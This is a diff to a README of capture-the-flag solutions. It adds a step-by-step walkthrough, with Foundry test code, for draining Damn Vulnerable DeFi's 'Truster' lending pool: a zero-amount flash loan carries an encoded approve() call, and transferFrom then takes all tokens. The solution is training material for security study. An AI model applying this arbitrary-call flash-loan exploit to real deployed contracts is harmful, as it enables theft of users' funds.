@@ -76,6 +76,33 @@ https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/02
 
 ## Challenge 3: Truster ##
 
+The steps to drain all tokens are: Call the flashLoan function asking to borrow 0 token, so we will not need to pay back anything. This is important because the attacker does not own any DVT token.
+
+```
+        vm.startPrank(attacker);
+        uint256 borrowAmt = 0;
+```
+Call the flashLoan with target as the DVT token address to execute the call method on the Token contract itself
+```
+        address targetContract = address(dvt);
+```
+Construct the data payload to make the TrusterLenderPool to call the DVT approve method
+```
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            attacker,
+            1000000 ether
+        );
+```
+Call flashloan
+```
+        trusterLenderPool.flashLoan(borrowAmt, attacker, targetContract, data);
+```
+Transfer all tokens to attacker
+```
+        dvt.transferFrom(address(trusterLenderPool), attacker, 1000000 ether);
+        vm.stopPrank();
+```
 Source Code:
 https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/03_Truster
 
